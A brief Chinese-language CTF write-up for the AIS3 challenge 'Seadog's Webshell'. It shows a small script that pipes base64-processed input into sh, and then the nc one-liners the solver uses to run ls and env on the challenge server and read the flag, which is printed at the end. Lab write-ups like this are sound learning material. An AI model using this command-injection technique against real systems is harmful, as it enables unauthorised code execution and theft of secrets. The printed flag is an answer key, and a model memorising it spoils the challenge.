# Seadog's Webshell
## 題目

## Important Source Code
``` bash
#!/bin/sh

exec 2>/dev/null
base64 | timeout 10s sh

```

## 解題
送進去的 code 必須同時符合 base64 的格式將其解碼送進去，因此 script 就用 `echo "//bin/ls" | base64 -d` 然後再 pipe 進 nc，並且用絕對路徑，這樣就可以用 `/` 填空位。
然而卻發現怎麼試都沒反應，因此用自己機器試了一下，發現 nc 沒送 eof，所以加了個 `-q 1`。
`echo "//bin/ls" | base64 -d | nc -q 1 chals1.ais3.org 12369`

成功

最後因為 flag 在 environment (根據 docker-ccompose.yml) 所以執行
`echo "/usr/bin/env" | base64 -d | nc -q 1 chals1.ais3.org 12369`


## Flag
`AIS3{ZXNjYXBpbmdfYmFzZTY0X3dpdGhfZW9m}`